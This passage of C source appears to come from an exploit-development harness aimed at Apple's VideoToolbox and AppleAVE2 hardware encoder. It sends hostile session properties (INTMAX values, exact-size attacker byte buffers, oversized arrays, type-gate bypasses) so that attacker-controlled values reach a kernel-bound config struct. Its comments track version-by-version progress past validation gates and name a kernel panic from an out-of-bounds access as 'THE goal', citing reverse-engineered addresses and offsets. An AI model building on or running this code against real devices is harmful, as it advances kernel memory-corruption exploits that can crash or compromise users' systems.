                    ds_tb_comp = (int)VTSessionSetProperty(sess, tbk, tbd);
                    CFRelease(tbk);
                    CFRelease(tbd);
                } else {
                    ds_tb_comp = -9999;
                }
            }
            propStat = (ds_hdr_trip[0] == 0 && ds_hdr_trip[1] == 0 && ds_hdr_trip[2] == 0) ? 0
                     : (ds_hdr_trip[0] != 0) ? ds_hdr_trip[0] : (ds_hdr_trip[1] != 0) ? ds_hdr_trip[1] : ds_hdr_trip[2];
        } else {
            const char *kkey = ds_opt_ungt_key((int)(val & 0xFF));
            if (kkey) {
                long dlen = val2;
                CFDataRef dat = NULL;
                if (dlen > 0 && dlen <= (1 << 20)) {
                    uint8_t *buf = (uint8_t *)malloc((size_t)dlen);
                    if (buf) {
                        memset(buf, 0x5a, (size_t)dlen);
                        dat = CFDataCreate(kCFAllocatorDefault, buf, (CFIndex)dlen);
                        free(buf);
                    }
                }
                if (dat) {
                    CFStringRef keyS = CFStringCreateWithCString(kCFAllocatorDefault, kkey, kCFStringEncodingUTF8);
                    propStat = VTSessionSetProperty(sess, keyS, dat);
                    CFRelease(keyS);
                    CFRelease(dat);
                } else {
                    dprintf(STDOUT_FILENO, "%s  I[%s] UNGT CFData alloc failed (len=%ld) - cell void\n", pfx, tag, dlen);
                    propStat = -9999;
                }
            } else {
                propStat = -9999;   /* bad key index - never let it read as DELIVERED */
            }
        }
    } else if (kind == DS_OPT_LA_GRIND || kind == DS_OPT_MKF_GRIND) {
        /* v62: re-fire the v61-ACCEPTED keys with a multi-frame grind. v61 OP03
         * (LookAheadFrames=INTMAX) and OP12 (MaxKeyFrameInterval=INTMAX) both returned
         * 0 with NO plugin gate line = the hostile value packs into the kernel-bound
         * config struct - the FIRST delivery since the campaign began. v62 grinds
         * val2 frames + CompleteFrames to push the kernel alloc (the lookahead ring /
         * the GOP ref-list sizing) past its gate. 0 again = the value rides the struct;
         * a PANIC/reboot on the drain = the 64747 kernel OOB. */
        const char *kkey = ds_opt_v62_key((int)kind);
        if (kkey) {
            CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
            CFStringRef keyS = CFStringCreateWithCString(kCFAllocatorDefault, kkey, kCFStringEncodingUTF8);
            propStat = VTSessionSetProperty(sess, keyS, nf);
            CFRelease(keyS);
            CFRelease(nf);
        }
    } else if (kind == DS_OPT_LA_MKF) {
        /* v62: BOTH accepted keys on ONE session - the compounded alloc: the kernel
         * lookahead ring (LookAheadFrames) + the GOP ref-list (MaxKeyFrameInterval)
         * sizing math in the same marshal. Both returned 0 in v61 individually. */
        CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFStringRef keyS = CFStringCreateWithCString(kCFAllocatorDefault, "LookAheadFrames", kCFStringEncodingUTF8);
        propStat = VTSessionSetProperty(sess, keyS, nf);
        CFRelease(keyS);
        keyS = CFStringCreateWithCString(kCFAllocatorDefault, "MaxKeyFrameInterval", kCFStringEncodingUTF8);
        OSStatus s2 = VTSessionSetProperty(sess, keyS, nf);
        CFRelease(keyS);
        CFRelease(nf);
        if (propStat == 0 && s2 != 0) propStat = (int)s2;
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set LookAheadFrames=%ld -> %d | MaxKeyFrameInterval=%ld -> %d (v62 COMPOUND - both ACCEPTED in v61 individually; 0/0 = both pack into the kernel-bound struct; PANIC/reboot = the compounded alloc OOB = THE goal)\n",
                pfx, tag, val, (int)propStat, val, (int)s2);
    } else if (kind == DS_OPT_QPMAP_BOOL) {
        /* v62: the CFBoolean TYPE-gate bypass. v61 OP10 (EnableUserQPMap=1 CFNumber)
         * was DELIVERED but the plugin gate is
         * 'AVE_Prop_AVC_SetEnableUserQPMap:5310 CFBooleanGetTypeID() == CFGetTypeID(pValue)'
         * -> -2003 wrong property type. Send kCFBooleanTrue - if the gate passes (0),
         * the kernel QP-map feature path OPENS and a hostile UserQPMap CFData rides it. */
        propStat = VTSessionSetProperty(sess, CFSTR("EnableUserQPMap"), kCFBooleanTrue);
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set EnableUserQPMap=CFBooleanTrue -> %d (v62 TYPE-gate bypass - v61's CFNumber died at the CFBooleanGetTypeID gate; 0 = the QP-map path OPENS - correlate 'AVE_Prop_AVC_SetEnableUserQPMap' + then ride UserQPMap CFData; a PANIC/reboot = the kernel QP-map OOB = THE goal)\n",
                pfx, tag, (int)propStat);
    } else if (kind == DS_OPT_QPMAP_DATA) {
        /* v62: EnableUserQPMap=TRUE (the bypass) + a UserQPMap CFData at attacker size -
         * the kernel gate 'UserQpMapSize (%d) does not match required size (%d), disabling
         * userQPMap feature'. Required for 1920x1080 = 8160 MBs x 4B = 32640. Under/over
         * sizes trip the gate (mapped dead end); EXACT size = the feature ACTIVATES and
         * the attacker bytes ride the kernel QP-map path. */
        OSStatus b1 = VTSessionSetProperty(sess, CFSTR("EnableUserQPMap"), kCFBooleanTrue);
        long dlen = val;
        uint8_t *buf = (uint8_t *)malloc((size_t)dlen);
        CFDataRef dat = NULL;
        if (buf) { memset(buf, 0x51, (size_t)dlen); dat = CFDataCreate(kCFAllocatorDefault, buf, (CFIndex)dlen); free(buf); }
        OSStatus b2 = dat ? VTSessionSetProperty(sess, CFSTR("UserQPMap"), dat) : -9999;
        if (dat) CFRelease(dat);
        propStat = (b1 != 0) ? (int)b1 : (int)b2;
        if (!buf || !dat)
            dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set EnableUserQPMap=TRUE -> %d | UserQPMap CFData ALLOC FAILED (%s) - cell void, no set attempted\n",
                    pfx, tag, (int)b1, !buf ? "malloc" : "CFDataCreate");
        else
            dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set EnableUserQPMap=TRUE -> %d | UserQPMap=CFData{%ldB} -> %d (v62 QP-map path - required = 32640 for 1920x1080; size mismatch = the 'disabling userQPMap' gate (mapped); EXACT = the feature ACTIVATES with attacker bytes = PANIC/reboot is THE goal)\n",
                    pfx, tag, (int)b1, dlen, (int)b2);
    } else if (kind == DS_OPT_FOURCC) {
        /* v62: InputPixelFormat with a REAL FourCC. v61 OP02 (0x7FFFFFFF) died at the
         * client -12902 value gate (not a valid format). A real FourCC forwards - the
         * kernel SourceFramePixelFormat format-table index. */
        uint32_t fc = (uint32_t)val;
        CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &fc);
        CFStringRef keyS = CFStringCreateWithCString(kCFAllocatorDefault, "InputPixelFormat", kCFStringEncodingUTF8);
        propStat = VTSessionSetProperty(sess, keyS, nf);
        CFRelease(keyS);
        CFRelease(nf);
        char fcS[5]; fcS[0] = (char)(val & 0xff); fcS[1] = (char)((val >> 8) & 0xff); fcS[2] = (char)((val >> 16) & 0xff); fcS[3] = (char)((val >> 24) & 0xff); fcS[4] = 0;
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set InputPixelFormat='%s' (0x%lx) -> %d (v62 REAL FourCC past the -12902 value gate - kernel SourceFramePixelFormat format-table index; 0 = the index packs into the kernel-bound struct; a PANIC/reboot = the format-table OOB = THE goal)\n",
                pfx, tag, fcS, val, (int)propStat);
    } else if (kind == DS_OPT_PUB_NUM || kind == DS_OPT_PUB_ARR || kind == DS_OPT_PUB_BOOL || kind == DS_OPT_PUB_GRIND || kind == DS_OPT_PUB_GRIND24) {
        /* v63/v64: the PUBLIC-key marshal sweep. The client's supported property list
         * (census OP02) is the forwardable set - the v62 daemon log proved the client
         * TRANSLATES raw keys to the PUBLIC kVTCompressionPropertyKey_* names before
         * forwarding, and the SDK literals ARE those public names. An ACCEPTED value
         * packs into the IOConnectCallMethod(Configure) marshal the AppleAVE2UserClient
         * kext reads field-by-field. v64 DS_OPT_PUB_GRIND = the same set + an x8-frame
         * grind (val2 = the key index, frames fixed at 8). */
        const char *kkey = ds_opt_pub_key((int)val2);
        if (kkey) {
            CFStringRef keyS = CFStringCreateWithCString(kCFAllocatorDefault, kkey, kCFStringEncodingUTF8);
            if (kind == DS_OPT_PUB_BOOL) {
                propStat = VTSessionSetProperty(sess, keyS, kCFBooleanTrue);
            } else if (kind == DS_OPT_PUB_ARR) {
                CFMutableArrayRef arr2 = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
                long v = val;
                CFNumberRef n1 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &v);
                CFNumberRef n2 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &v);
                CFArrayAppendValue(arr2, n1);
                CFArrayAppendValue(arr2, n2);
                CFRelease(n1); CFRelease(n2);
                propStat = VTSessionSetProperty(sess, keyS, arr2);
                CFRelease(arr2);
            } else {
                CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
                propStat = VTSessionSetProperty(sess, keyS, nf);
                CFRelease(nf);
            }
            CFRelease(keyS);
        }
    } else if (kind == DS_OPT_DATARATE) {
        /* v65: DataRateLimits = {INTMAX, val2}. v64's {INTMAX,1} returned 0 with NO
         * FIG line (the seconds-bypass rode clean - the buffer = rate * seconds VBV
         * size-math got the INTMAX element ungated). v65 OP04 sends seconds=2 = the
         * int64 OVERFLOW shape: INTMAX x 2 wraps the product (the FIG seconds clamp,
         * seconds > 10 -> 10, never fires for 2). */
        CFStringRef keyS = CFStringCreateWithCString(kCFAllocatorDefault, "DataRateLimits", kCFStringEncodingUTF8);
        CFMutableArrayRef arr2 = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        long v1 = val, v2 = (val2 > 0 && val2 <= 120) ? val2 : 1;
        CFNumberRef n1 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &v1);
        CFNumberRef n2 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &v2);
        CFArrayAppendValue(arr2, n1);
        CFArrayAppendValue(arr2, n2);
        CFRelease(n1); CFRelease(n2);
        propStat = VTSessionSetProperty(sess, keyS, arr2);
        CFRelease(arr2);
        CFRelease(keyS);
    } else if (kind == DS_OPT_RC_PAIR) {
        /* v66: the RCQPRange COMPOUND pair - SoftMinQuantizationParameter=val THEN
         * SoftMaxQuantizationParameter=val2 on ONE session. v65 OP13 proved the two
         * gates DISAGREE: the SetSoftMin gate is bitdepth-GENERIC (accepts -12 =
         * min(-6*(8-8), -6*(10-8))) but the session-level FIG validator
         * (AVE_ValidateEncoderParameters at Prepare) is bitdepth-SPECIFIC (8-bit
         * session floor 0) - so a prop-accepted pair can still kill the session
         * (-1001 -> -12902, zero callbacks) = the deepest reach into the config. */
        CFStringRef kSMin = CFStringCreateWithCString(kCFAllocatorDefault, "SoftMinQuantizationParameter", kCFStringEncodingUTF8);
        CFStringRef kSMax = CFStringCreateWithCString(kCFAllocatorDefault, "SoftMaxQuantizationParameter", kCFStringEncodingUTF8);
        CFNumberRef nMin = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFNumberRef nMax = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val2);
        propStat = VTSessionSetProperty(sess, kSMin, nMin);
        propStat2 = VTSessionSetProperty(sess, kSMax, nMax);
        CFRelease(nMin); CFRelease(nMax);
        CFRelease(kSMin); CFRelease(kSMax);
    } else if (kind == DS_OPT_PPS_ARR || kind == DS_OPT_PPS_GRIND) {
        /* v66/v68: UserParameterSetsIds = CFArray of val2 elements each = val. The
         * v66 run LEAKED the COUNT gate ('UserParameterSetIdsCount <= 9 [0, 9]' -
         * capped at NINE at the plugin, the kernel never sees >9); the v67 run re-
         * confirmed it (9 = 0 with a cb fires=2 double-fire on the 'Forcing the PPS
         * count to 1' path, 10 = -2004). DS_OPT_PPS_GRIND = the same array + an
         * 8-frame drain of the forced-1 double-fire path. */
        CFStringRef keyS = CFStringCreateWithCString(kCFAllocatorDefault, "UserParameterSetsIds", kCFStringEncodingUTF8);
        int cnt = (int)val2;
        if (cnt < 1) cnt = 1;
        if (cnt > 256) cnt = 256;
        CFMutableArrayRef arr2 = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        long v = val;
        for (int i = 0; i < cnt; i++) {
            CFNumberRef ni = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &v);
            CFArrayAppendValue(arr2, ni);
            CFRelease(ni);
        }
        propStat = VTSessionSetProperty(sess, keyS, arr2);
        CFRelease(arr2);
        CFRelease(keyS);
    } else if (kind == DS_OPT_PPS_HEVC) {
        /* v84: HEVC UserParameterSetsIds - the FIRST-ever HEVC UPS shot (the v65-72
         * UPS sweeps were AVC-only: count gate [0,9] + the 'eRCMode 1' force-to-1).
         * The plugin AVE_Prop_HEVC_SetUserParameterSetsIds (2b94acffc) parses the
         * CFArray via AVE_DW_GetInt32Array into a 21-slot stack buffer, gates count
         * [1,21] ('cmp w0, #0x15; b.gt' reject), gates element 0/1 < 0x10 + 2+ < 0x40,
         * and stores the COUNT into sess+0x8a0 - the SAME field the kext session-config
         * dump (AppleAVE2 0xfffffff0086f5844) reads as its signed >=1 loop bound with
         * NO upper cap, reading [sess+0x8a4 + idx*4] and logging 'MCTFStrengthLevel'.
         * val & 0xFF = element value (0xF legal for ALL elements), (val>>8)&0xFF =
         * count (21 = max legal), (val>>16)&0xF = co-arm bits (8 = EnableMCTF=true
         * post-create - arms the kext MCTF config path so the -17691 format gate
         * PROVES the config reached the kext before the encode). */
        long pv = val & 0xFF;
        long pcnt = (val >> 8) & 0xFF;
        if (pcnt < 1) pcnt = 1;
        if (val2 & 0x4000) {
            if (pcnt > 9) pcnt = 9;   /* v91: the AVC twin rides an H264 session - the AVC UPS gate is [0,9] (v67 'UserParameterSetIdsCount <= 9') */
        } else {
            if (pcnt > 21) pcnt = 21;   /* the HEVC plugin count gate [1,21] */
        }
        CFStringRef keyS = CFStringCreateWithCString(kCFAllocatorDefault, "UserParameterSetsIds", kCFStringEncodingUTF8);
        CFMutableArrayRef arr2 = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        if (arr2) {
            long v = pv;
            int w2i = (val2 & 0x4000) ? 17 : 18;   /* v92: word-2 (0x8ac) element index - AVC 0x88a+17*2, HEVC 0x888+18*2 */
            for (int i = 0; i < (int)pcnt; i++) {
                long vv2 = v;
                /* v92: the word-2 USL-threshold probe - element w2i (HEVC 18 / AVC 17)
                 * = v (bit 0x20000 = override, value = (val2>>18)&0xFF), element w2i+1 = 0
                 * so the dump word-2 (0x8ac) = v EXACTLY (the reviewer fix - no v|v<<16
                 * packing) - OUR value instead of the stale default. */
                if (val2 & 0x20000) {
                    long wv2 = (val2 >> 18) & 0xFF;
                    if (i == w2i) vv2 = wv2;
                    else if (i == w2i + 1) vv2 = 0;
                }
                CFNumberRef ni = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &vv2);
                CFArrayAppendValue(arr2, ni);
                CFRelease(ni);
            }
            propStat = VTSessionSetProperty(sess, keyS, arr2);
            CFRelease(arr2);
        } else {
            propStat = -9999;   /* v84: NULL-array guard - a failed CFArray must NOT look like a 0 ACCEPTED ride */
        }
        CFRelease(keyS);
        if ((val >> 16) & 0x1) {
            /* v86: QuantizationScalingMatrixPreset post-create - GATE-BYPASS A.
             * The v85 run (13:21, OP08) PROVED preset 1 (Flat) does NOT flip the
             * force-gate's scaling_list_enabled_flag (the setter
             * AVE_Prop_HEVC_SetQuantizationScalingMatrixPreset @2b94c41e4 accepts
             * [1,7] but Flat is the DEFAULT matrix = no SPS flag); the CUSTOM-
             * MATRIX presets 2/3/5/7 mark the SPS (sps +0x25c bit0) so the gate's
             * 'tbnz w9, #0x0, skip' fires = i32PPSsCount rides UNFORCED into the
             * kext dump-loop bound (sess+0x8a0). The BARE key is the v76 census
             * IN-LIST [54] name (the iOS SDK constant is macOS-only - the same
             * AllowPixelTransfer precedent). */
            long qv = 2;
            CFNumberRef qn = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &qv);
            propStat2 = VTSessionSetProperty(sess, CFSTR("QuantizationScalingMatrixPreset"), qn);
            CFRelease(qn);
        } else if ((val >> 16) & 0x2) {
            long qv2 = 3;
            CFNumberRef qn2 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &qv2);
            propStat2 = VTSessionSetProperty(sess, CFSTR("QuantizationScalingMatrixPreset"), qn2);
            CFRelease(qn2);
        } else if ((val >> 16) & 0x4) {
            long qv3 = 5;
            CFNumberRef qn3 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &qv3);
            propStat2 = VTSessionSetProperty(sess, CFSTR("QuantizationScalingMatrixPreset"), qn3);
            CFRelease(qn3);
        } else if ((val >> 16) & 0x8) {
            long qv4 = 7;
            CFNumberRef qn4 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &qv4);
            propStat2 = VTSessionSetProperty(sess, CFSTR("QuantizationScalingMatrixPreset"), qn4);
            CFRelease(qn4);
        }
        /* v87: the eRCMode-HwVal GATE-BYPASS - the PUBLIC 'EncoderUsage' key
         * (census IN-LIST [15]) -> AVE_Prop_HEVC_SetUsage -> sess+0x9ec ->
         * AVE_ManageSessionSettings 2b947fb30 (0x9ec==1) -> eRCMode=0x14 HwVal
         * -> the kext force-to-1 gate SKIPS. (val>>16) bits 0x100/0x200/0x400
         * = EncoderUsage 1/20/37. */
        long usg7 = ((val >> 16) & 0xF00) >> 8;
        if (usg7) {
            long uv7 = (usg7 == 1) ? 1 : (usg7 == 2) ? 20 : 37;
            CFNumberRef nu7 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &uv7);
            g_opt_usg_stat = VTSessionSetProperty(sess, CFSTR("EncoderUsage"), nu7);
            CFRelease(nu7);
        }
        /* v88: the QPMod ch_qp w22 lever - ChromaQPIndexOffsetMultiPPS (census IN-LIST,
         * public) -> AVE_Prop_HEVC_SetChromaQPIndexOffsetMultiPPS (2b94ac180): count gate
         * [2,16] EVEN, values < 0xd, even elements -> sess+0x6474+ (7 slots in the Validate
         * checked region 0x6470-0x648f) = the w22 that must == i32PPSsCount. (val>>16) bit
         * 0x10 = 16 elements. */
        long cqp8 = ((val >> 16) & 0x10);
        if (cqp8 && !(val2 & 0x4000)) {   /* v91 F5: on the 0x4000 AVC-twin cells the session is H264 - only the AVC CQP twin below fires, no double SetProperty */
            CFMutableArrayRef cqa = CFArrayCreateMutable(kCFAllocatorDefault, 16, &kCFTypeArrayCallBacks);
            for (int ci = 0; ci < 16; ci++) {
                long cv8 = (val2 & 0x80000) ? 0x7fffffff : ((val2 & 0x100000) ? 0xFFFF : 1);   /* v95: the retrieve gate value+0xc < 0x19 (2b94ac284) caps at < 0xd - INTMAX/0xFFFF = the gate-reject proof cells; 1 = the validated ride */
                CFNumberRef cn8 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &cv8);
                CFArrayAppendValue(cqa, cn8);
                CFRelease(cn8);
            }
            g_opt_cqp_stat = VTSessionSetProperty(sess, CFSTR("ChromaQPIndexOffsetMultiPPS"), cqa);
            CFRelease(cqa);
        }
        /* v89: the MCTF CO-ARM - EnableMCTF (census IN-LIST [39], public) with the
         * count-19 ride: the kext MCTF path consumes the SAME corrupted strength
         * region (0x8a4-0x8b2 = our UPS halfwords); the ImgBuf pixel-format gate
         * rejects the encode FAST (-17691) but the OOB dump read already fired at
         * Prepare. (val>>16) bit 0x20 = EnableMCTF. Standalone (not else-if) so it
         * can co-fire with the QSM flag. */
        if ((val >> 16) & 0x20) {
            OSStatus mctfSt = VTSessionSetProperty(sess, CFSTR("EnableMCTF"), kCFBooleanTrue);
            dprintf(STDOUT_FILENO, "%s    [v89] EnableMCTF=true -> %d (0 = the kext MCTF arm is armed)\n", pfx, (int)mctfSt);
        }
        /* v91: the NEW MCTFStrengthLevel co-arm (val2 & 0x2000) - NEVER FIRED. The plugin
         * AVE_Prop_HEVC_SetMCTFStrengthLevel (2b94df424) parses a CFArray, gates count<=2
         * + values < 0x19 (the '0 <= iMCTFStrengthLevel && iMCTFStrengthLevel < 25' gate),
         * and writes each value to sess+0x8b4 + idx*4 = EXACTLY dump words 4-5 of the kext
         * dump loop window (0x8a4 + i*4). At validated count-8 the dump consumes our words
         * INSIDE the strength array. val2 bit 0x2001 = the max-legal {0x18,0x18} variant. */
        if (val2 & 0x2000) {
            long sv0 = (val2 & 0x1) ? 0x18 : 0x12;   /* 0x2000 = {0x12,0x18}, 0x2001 = {0x18,0x18} */
            long sv1 = 0x18;
            CFMutableArrayRef mctfa = CFArrayCreateMutable(kCFAllocatorDefault, 2, &kCFTypeArrayCallBacks);
            if (mctfa) {
                CFNumberRef nv0 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &sv0);
                CFNumberRef nv1 = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &sv1);
                CFArrayAppendValue(mctfa, nv0);
                CFArrayAppendValue(mctfa, nv1);
                CFRelease(nv0);
                CFRelease(nv1);
                g_opt_str_stat = VTSessionSetProperty(sess, CFSTR("MCTFStrengthLevel"), mctfa);
                CFRelease(mctfa);
            } else {
                g_opt_str_stat = -9999;   /* v91 reviewer F4: a failed CFArray must NOT look like a stale 0 */
            }
            dprintf(STDOUT_FILENO, "%s    [v91] MCTFStrengthLevel={%ld,%ld} -> %d (0 = our words ride into sess+0x8b4/0x8b8)\n",
                    pfx, sv0, sv1, (int)g_opt_str_stat);
        }
        /* v95: the QP-MAP-UNLOCK arm (val2 & 0x200000) - EnableUserQPMap=TRUE (the v62
         * CFBoolean type-gate bypass PROVED it rides) + the per-frame 'UserQpMap'
         * pixel-buffer attachment (built in the tail right before EncodeFrame - frame
         * attachments ARE forwarded by the daemon; the v63 -12900 was the SESSION-prop
         * path, a different channel). The kernel AVE_Client_Enc_Check_Process gate
         * passes when PerFrameData.userQpMap != 0 -> the frame finally enters the real
         * encoder with our UPS/CQP config. */
        if (val2 & (0x200000 | 0x2000000)) {
            if (val2 & 0x200000) g_opt_qpmap_arm = 1;   /* v95: the pixel-buffer attachment (OP87 dual only) */
            OSStatus enSt = VTSessionSetProperty(sess, CFSTR("EnableUserQPMap"), kCFBooleanTrue);
            if (enSt != 0)   /* v105 quiet: the -13 arm rides (prints only on failure) */
                dprintf(STDOUT_FILENO, "%s    [v98] EnableUserQPMap=TRUE -> %d (FAIL)\n", pfx, (int)enSt);
        }
        /* v99: QP range lift (0x10000) - expand BlkQPRange from [0,48] to [0,51].
         * The MaxAllowedFrameQP/MinAllowedFrameQP set the kernel's BlkQPRange clamp.
         * Without this, 0xFF per-MB QP words (0xFFFFFFFF as unsigned u32 = 4294967295)
         * clamp to 48 (or 0 as signed i32). Opening to [0,51] lets them ride at QP=51
         * (unsigned saturate, clamped by the encoder's hardware QP range). */
        if (kind == DS_OPT_PPS_HEVC && (val2 & 0x10000)) {
            int maxQP = 51, minQP = 0;
            OSStatus qpMaxSt = -1, qpMinSt = -1;
            CFNumberRef maxNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &maxQP);
            if (maxNum) {
                qpMaxSt = VTSessionSetProperty(sess, kVTCompressionPropertyKey_MaxAllowedFrameQP, maxNum);
                CFRelease(maxNum);
            }
            CFNumberRef minNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &minQP);
            if (minNum) {
                qpMinSt = VTSessionSetProperty(sess, kVTCompressionPropertyKey_MinAllowedFrameQP, minNum);
                CFRelease(minNum);
            }
            if (qpMaxSt != 0 || qpMinSt != 0)   /* v105 quiet: the [0,51] lift (prints only on failure) */
                dprintf(STDOUT_FILENO, "%s    [v99] QPRange lift FAILED max=%d min=%d\n", pfx, (int)qpMaxSt, (int)qpMinSt);
        }

        /* v91: the AVC CQP twin (val2 & 0x4000) - the session is H264 (codec switch
         * above), so ChromaQPIndexOffsetMultiPPS dispatches to the AVC setter
         * AVE_Prop_AVC_SetChromaQPIndexOffsetMultiPPS (2b943f804, count gate <= 0x10
         * -> 0xf54) + the AVC ch_qp gate @2b940e764 was NEVER fired. NOTE: the UPS
         * setter on an H264 session is AVE_Prop_AVC_SetUserParameterSetsIds (count gate
         * [0,9] per v67) - the clamp at the top of this block already capped it. */
        if (val2 & 0x4000) {
            /* v91: UPS count already clamped to [0,9] at the top of this block for the
             * AVC session - nothing further to do here (the CQP16 + Usage arms above
             * already ran against the H264 session = the AVC setters). */
        }
        if (val2 & 0x4000) {
            CFMutableArrayRef avcqa = CFArrayCreateMutable(kCFAllocatorDefault, 16, &kCFTypeArrayCallBacks);
            for (int ai = 0; ai < 16; ai++) {
                long avv = (val2 & 0x80000) ? 0x7fffffff : ((val2 & 0x100000) ? 0xFFFF : 1);
                CFNumberRef avn = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &avv);
                CFArrayAppendValue(avcqa, avn);
                CFRelease(avn);
            }
            g_opt_cqp_stat = VTSessionSetProperty(sess, CFSTR("ChromaQPIndexOffsetMultiPPS"), avcqa);
            CFRelease(avcqa);
            if (g_opt_cqp_stat != 0)   /* v105 quiet: the AVC ch_qp lever (prints only on failure) */
                dprintf(STDOUT_FILENO, "%s    [v91] AVC CQP16 -> %d (FAIL)\n", pfx, (int)g_opt_cqp_stat);
        }
        ds_pps_hevc_cnt = (int)pcnt;   /* v84: the receipt prints the CAPPED count */
    } else if (kind == DS_OPT_USAGE_BOOL || kind == DS_OPT_USAGE_GRIND || kind == DS_OPT_USAGE_GRIND24) {
        /* v67/v68: the USAGE-COMPOUND - EncoderUsage=<val2> THEN EnableWeighted-
         * Prediction=<val!=0> on ONE session. The v67 run SPLIT the usage map:
         * 4 Streaming = -12900 ('kVTCompressionPropertyKey_Usage 4 not supportd'
         * = DEAD at the plugin - the 'escape' failed on the usage side) but 1
         * VideoProcessing = 0 ACCEPTED = the FIRST accepted usage - and the com-
         * pound RODE INTO THE PROCESS PATH ('AVE_UC_Process:471 / AVE_USL_Drv_
         * Process:1573 fail to process -1015' -> client cb -17691) = the weighted-
         * pred machinery is LIVE in the USL layer. Usage values: 0 Unknown, 1
         * VideoProcessing, 2 StillImage, 3 FastSource, 4 Streaming.
         * DS_OPT_USAGE_GRIND = the pair + an 8-frame drain; DS_OPT_USAGE_GRIND24
         * = the pair + a 24-frame deep drain. */
        CFStringRef kUse = CFStringCreateWithCString(kCFAllocatorDefault, "EncoderUsage", kCFStringEncodingUTF8);
        CFStringRef kEWP = CFStringCreateWithCString(kCFAllocatorDefault, "EnableWeightedPrediction", kCFStringEncodingUTF8);
        long uv = val2;
        CFNumberRef nUse = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &uv);
        propStat = VTSessionSetProperty(sess, kUse, nUse);
        CFRelease(nUse);
        propStat2 = VTSessionSetProperty(sess, kEWP, val ? kCFBooleanTrue : kCFBooleanFalse);
        CFRelease(kUse); CFRelease(kEWP);
    } else if (kind == DS_OPT_QP_MIX) {
        /* v67: the VALIDATOR-FLOOR discriminator - MinAllowedFrameQP=val THEN
         * SoftMinQuantizationParameter=val2 on ONE session. v66 OP03/05/06 proved
         * the session RCQPRange validator kills ANY negative SoftMin at Prepare
         * (-1001 -> -12902) - but WHICH field feeds the composite floor is unknown:
         * if the LEGAL MinAllowed=0 rescues SoftMin=-12, the floor comes from
         * MinAllowed (a legal-min-over-hostile-softmin pair rides = deeper than
         * OP13-v65); if it still dies, SoftMin feeds the validator directly. */
        CFStringRef kMIn = CFStringCreateWithCString(kCFAllocatorDefault, "MinAllowedFrameQP", kCFStringEncodingUTF8);
        CFStringRef kSMin = CFStringCreateWithCString(kCFAllocatorDefault, "SoftMinQuantizationParameter", kCFStringEncodingUTF8);
        CFNumberRef nMIn = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFNumberRef nSMin = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val2);
        propStat = VTSessionSetProperty(sess, kMIn, nMIn);
        propStat2 = VTSessionSetProperty(sess, kSMin, nSMin);
        CFRelease(nMIn); CFRelease(nSMin);
        CFRelease(kMIn); CFRelease(kSMin);
    } else if (kind == DS_OPT_USAGE_COMP) {
        /* v69: the FAULTING-PATH COMPOUND - EncoderUsage=1 THEN one pub-table key
         * (val2 = key index) on the SAME session. The v68 run PROVED usage-1 is the
         * ONLY accepted usage AND that it faults the USL process path on its own
         * ('AVE_UC_Process:471 / AVE_USL_Drv_Process:1573 fail to process -1015' ->
         * cb -17691, no EWP needed). The compound rides a delivered hostile numeric
         * key on the faulting path - does the fault MODE change / escalate? */
        CFStringRef kUseC = CFStringCreateWithCString(kCFAllocatorDefault, "EncoderUsage", kCFStringEncodingUTF8);
        const char *kname = ds_opt_pub_key((int)val2);
        long uvc = 1;
        CFNumberRef nUseC = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &uvc);
        propStat = VTSessionSetProperty(sess, kUseC, nUseC);
        CFRelease(nUseC);
        if (kname) {
            CFStringRef kPubC = CFStringCreateWithCString(kCFAllocatorDefault, kname, kCFStringEncodingUTF8);
            CFTypeRef vPubC;
            if (val & 0x100) vPubC = kCFBooleanTrue;                 /* v71: the SEI CFBoolean TYPE gate */
            else if (val & 0x200) vPubC = kCFBooleanFalse;
            else vPubC = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
            propStat2 = VTSessionSetProperty(sess, kPubC, vPubC);
            if (!(val & 0x300)) CFRelease((CFNumberRef)vPubC);       /* only the created CFNumber */
            CFRelease(kPubC);
        }
        CFRelease(kUseC);
    } else if (kind == DS_OPT_USAGE_VAR) {
        /* v72: the NULL-ROW DISCRIMINATION grid - v71 (00:12) crashed the daemon 11
         * times; the pulled .ips (001212 pid 432 + 001253 pid 485) are BOTH
         * 'vt_Copy_420v_Crop -> memmove' at 0x0 = a NULL src-row pointer in the
